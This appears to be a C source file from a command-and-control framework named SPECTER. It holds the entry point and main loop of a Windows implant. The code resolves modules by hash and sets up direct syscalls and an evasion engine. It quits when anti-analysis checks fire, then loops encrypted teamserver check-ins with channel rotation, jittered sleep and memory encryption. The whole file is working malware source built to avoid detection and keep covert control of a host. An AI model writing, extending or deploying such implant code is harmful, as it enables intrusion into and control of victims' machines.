/**
 * SPECTER Implant — PIC Entry Point & Main Loop
 *
 * Position-independent entry. Resolves PEB, bootstraps the syscall
 * engine, initializes all subsystems (config, sleep, comms), and
 * enters the main callback loop.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "syscalls.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "sleep.h"
#include "evasion.h"
#include "antianalysis.h"
#include "profile.h"

/* External globals */
extern SYSCALL_TABLE g_syscall_table;

/* Forward declarations for cleanup */
static void implant_cleanup(void);

__attribute__((section(".text.entry")))
void implant_entry(PVOID param) {
    (void)param;
    NTSTATUS status;

    /* ---- Zero out global context ---- */
    spec_memset(&g_ctx, 0, sizeof(IMPLANT_CONTEXT));

    /* ---- Step 1: Verify PEB access ---- */
    PPEB peb = get_peb();
    if (!peb)
        return;

    /* ---- Step 2: Resolve ntdll and kernel32 base addresses ---- */
    PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll_base)
        return;

    PVOID k32_base = find_module_by_hash(HASH_KERNEL32_DLL);
    (void)k32_base;

    /* ---- Step 3: Initialize the syscall engine ---- */
    g_ctx.syscall_table = &g_syscall_table;
    status = sc_init(g_ctx.syscall_table);
    if (!NT_SUCCESS(status))
        return;

    g_ctx.clean_ntdll = g_ctx.syscall_table->clean_ntdll;

    /* ---- Step 3b: Initialize evasion engine ---- */
    status = evasion_init(&g_ctx);
    /* Evasion init failure is non-fatal — syscalls still work via
       raw spec_syscall fallback in evasion_syscall() */
    (void)status;

    /* ---- Step 3c: Anti-analysis checks ---- */
    {
        ANTIANALYSIS_CONFIG aa_cfg;
        ANALYSIS_RESULT aa_result;
        antianalysis_default_config(&aa_cfg);
        ANALYSIS_TYPE aa_type = antianalysis_check(&g_ctx, &aa_cfg, &aa_result);
        if (aa_type != ANALYSIS_CLEAN) {
            antianalysis_respond(&g_ctx, aa_cfg.response);
            return;
        }
    }

    /* ---- Step 4: Initialize config store ---- */
    status = cfg_init(&g_ctx);
    if (!NT_SUCCESS(status))
        return;

    /* ---- Step 5: Check kill date before proceeding ---- */
    if (cfg_check_killdate(&g_ctx))
        return;

    /* ---- Step 6: Initialize sleep controller ---- */
    status = sleep_init(&g_ctx);
    if (!NT_SUCCESS(status))
        return;

    /* ---- Step 7: Initialize communications engine ---- */
    status = comms_init(&g_ctx);
    if (!NT_SUCCESS(status))
        return;

    /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
    /* Profile blob is expected to be provided via config update or
     * embedded after config blob. When available, parse and attach
     * to comms engine for profile-driven traffic shaping. */
    {
        static PROFILE_CONFIG g_profile_cfg;
        /* TODO: Locate profile blob (e.g., second config region or
         * delivered via initial config update from teamserver).
         * For now, profile is set via comms_set_profile() after
         * a profile blob is received from the teamserver. */
        (void)g_profile_cfg;
    }

    /* ---- Step 8: Enter main loop ---- */
    g_ctx.running = TRUE;
    DWORD consecutive_failures = 0;

    while (g_ctx.running) {
        /* Perform encrypted check-in with teamserver */
        status = comms_checkin(&g_ctx);

        if (!NT_SUCCESS(status)) {
            consecutive_failures++;

            /* Try rotating to next channel on failure */
            comms_rotate_channel(&g_ctx);

            /* Check retry limit */
            IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
            if (cfg && cfg->max_retries > 0 &&
                consecutive_failures >= cfg->max_retries) {
                g_ctx.running = FALSE;
                break;
            }
        } else {
            consecutive_failures = 0;
        }

        /* TODO Phase 04+: process received tasks here */

        /* Check kill date */
        if (cfg_check_killdate(&g_ctx)) {
            g_ctx.running = FALSE;
            break;
        }

        /* Sleep with jitter and memory encryption */
        sleep_cycle(&g_ctx);
    }

    /* ---- Cleanup and exit ---- */
    implant_cleanup();
    return;
}

static void implant_cleanup(void) {
    /* Zero sensitive data from global context */
    IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
    if (cfg)
        spec_memset(cfg, 0, sizeof(IMPLANT_CONFIG));

    g_ctx.running = FALSE;
}
